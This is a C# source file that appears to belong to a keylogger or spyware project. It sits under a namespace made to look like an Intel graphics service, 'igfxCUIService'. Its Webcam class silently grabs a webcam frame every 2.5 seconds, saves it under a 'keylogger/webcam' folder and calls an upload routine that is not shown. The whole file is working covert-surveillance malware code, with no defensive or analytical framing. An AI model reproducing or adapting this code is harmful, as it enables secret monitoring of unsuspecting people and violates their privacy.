using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace igfxCUIService
{
    class Webcam
    {

        #region [webcam]


        static FilterInfoCollection WebcamColl;
        static VideoCaptureDevice Device;
        public static DateTime datum = DateTime.Now;
        public static decimal hour;
        public static decimal minuten;
        public static decimal seconde;
        public static string folderName = @"D:/keylogger/webcam/";
        public static string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
        public static decimal webcamhour;
        public static decimal webcamminut;
        public static decimal webcamseconde;

        #endregion

        #region [ aantal websnaphot]
        public static void Aantalwebshots()
        {
            for (int i = 0; i < 1500000; i++)
            {
                Thread.Sleep(2500);
                DateTime TimeNow = DateTime.Now;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;

                WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                //if you have connected with one more camera choose index as you want 
                Device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
                Device.Start();
                Device.NewFrame += new NewFrameEventHandler(Imagesave);
            }
        }

        #endregion

        #region [webcam fotos maken]
        static void Imagesave(object sender, NewFrameEventArgs eventArgs)
        {
            
            Image img = (Bitmap)eventArgs.Frame.Clone();
            System.IO.Directory.CreateDirectory(pathString);

            webcamhour = hour;
            webcamminut = minuten;
            webcamseconde = seconde;
            img.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
            Device.SignalToStop();

            Upload.Webcamupload();
            
        }

        #endregion

    }
}